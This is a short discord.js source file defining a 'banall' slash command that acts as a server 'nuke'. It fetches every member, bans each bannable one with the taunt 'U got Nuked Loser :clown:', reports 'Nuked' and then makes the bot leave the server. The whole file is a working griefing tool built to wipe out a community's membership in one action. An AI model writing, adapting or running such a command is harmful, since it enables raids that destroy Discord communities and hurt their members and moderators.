const { SlashCommandBuilder, PermissionFlagsBits, PermissionsBitField } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('banall')
        .setDescription('Bans every Loser :clown:')
        .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers)
        .setDMPermission(false),

    async execute(interaction) {
        await interaction.reply({ content: "Nuking", ephemeral: true });
        if (interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers) || interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await interaction.guild.members.fetch({ force: true }).then(members => {
                members.forEach(member => {
                    if (member.bannable) member.ban({ reason: "U got Nuked Loser :clown:" });
                });
            });
        }
        else {
            await interaction.editReply("I don't have permission to ban");
        }
        await interaction.editReply({ content: "Nuked", ephemeral: true });
        await interaction.guild.leave();
    },
};